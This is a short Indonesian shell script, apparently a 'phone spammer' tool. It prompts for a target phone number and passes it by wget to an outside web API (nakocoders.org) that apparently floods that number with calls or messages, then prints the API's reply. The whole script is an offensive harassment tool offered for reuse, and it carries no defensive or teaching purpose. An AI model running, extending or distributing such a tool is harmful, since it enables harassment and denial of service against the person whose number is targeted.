#!/bin/sh
# Thanks To ALBEDO
# Boleh Di Recode
clear;
clear;
bacot() {
wget -O jsn.tmp "https://0x.nakocoders.org/rest-api/lain-nya/api.php?nomor=$dacok" 2>/dev/null
if [[ $(cat jsn.tmp) ]]; then
jq=$(cat jsn.tmp | jq -r .msg)
echo "$jq"
fi
}
echo -e "\e[36m++++++++++++++++++++++++++++"
echo "+    -Spammer Telpon       +"
echo "+    -Creat By R.A.F       +"
echo -e "\e[36m++++++++++++++++++++++++++++"
  date
echo -e "\e[37mᴵᴺˢᴹ°૨เdнσ"
echo -e "\e[0;33m"
read -p "Masukkan Nomor TARGET => " dacok
bacot $dacok
